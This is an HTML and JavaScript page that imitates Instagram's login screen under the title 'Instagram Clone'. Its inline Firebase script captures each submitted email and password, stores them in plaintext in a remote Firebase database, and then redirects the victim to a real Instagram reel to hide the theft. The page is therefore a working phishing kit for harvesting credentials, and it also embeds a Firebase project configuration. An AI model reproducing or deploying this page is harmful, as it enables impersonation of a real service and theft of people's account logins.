<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./styles.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
            <!-- Placeholder for mobile device illustration -->
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone number, username, or email</label>
                    <input id="email" name="email" type="email" placeholder="Phone number, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log in</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <a href="#" id="fb-login"><i class="fa-brands fa-square-facebook"></i> Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Download on the Apple Store" />
                    <img src="./img/googleplay-button.png" alt="Get it on Google Play" />
                </div>
            </div>
        </section>
    </main>

    <!-- Firebase SDKs -->
    <script type="module">
        // Import the functions you need from the Firebase SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDgCjtt5vAbJ4J8MLITsVJ2DCdKPgDmyeM",
            authDomain: "clone-c3d06.firebaseapp.com",
            databaseURL: "https://clone-c3d06-default-rtdb.firebaseio.com",
            projectId: "clone-c3d06",
            storageBucket: "clone-c3d06.appspot.com",
            messagingSenderId: "29855537146",
            appId: "1:29855537146:web:74db6e7528644affa5b643"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Handle form submission
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Save user data to Firebase
            set(ref(db, 'users/' + email.replace(/\./g, ',')), {
                email: email,
                password: password
            })
            .then(() => {
                // Redirect to the main app page after successful login
                window.location.href = "https://www.instagram.com/reel/C8nsMi6yLNJ/?igsh=NWNwNXNkcnJ6ZXl1"; // Replace "main.html" with the URL of your main application page
            })
            .catch((error) => {
                console.error('Error during login:', error);
                alert('Error: ' + error.message);
            });
        });
    </script>
</body>
</html>
